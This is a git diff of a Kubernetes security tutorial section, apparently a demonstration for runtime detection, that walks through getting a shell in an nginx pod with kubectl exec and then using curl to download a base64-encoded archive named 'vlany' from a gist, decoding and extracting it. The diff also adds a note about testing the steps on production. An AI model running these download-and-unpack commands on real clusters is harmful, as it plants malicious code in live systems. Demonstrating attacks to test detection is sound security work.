@@ -1,5 +1,7 @@
 # The Attack
 
+<<Need to finalize and test these steps on production
+
 Let's simulate an attack on our cluster.  In this example we will use `kubectl exec` to download a `tar` file, explode it and run some other nefarious commands.
 
 First let's create a deployment.
@@ -24,7 +26,7 @@ Make a note the Pod name.
 Now that the deployment is running, let's simulate the attack.  Run the following command to create a shell into the running Container, substituting the pod name as appropriate
 
 ```
-$ kubectl exec -it nginx-65f88748fd-mbhcc -- /bin/bash
+$ kubectl exec -it nginx-65f88748fd-mbhcc -n voting-app-- /bin/bash
 root@nginx-65f88748fd-mbhcc:/#
 ```
 
@@ -53,9 +55,8 @@ You will be presented with a command prompt similar to this:
 `I have no name!@example-nginx-769dfcf684-l4m67:/app$`
 
 You can execute a few commands inside the container, or even download some malicious file.  
-`cd /tmp &&
+`apt-get update &&
+apt-get install curl -y &&
+cd /tmp &&
 curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz &&
 tar zxvf vlany-master.tar.gz`
-
-Remember that the capture was configured to go on for 20 seconds after the event, so
-make sure to do execute your commands within that time.
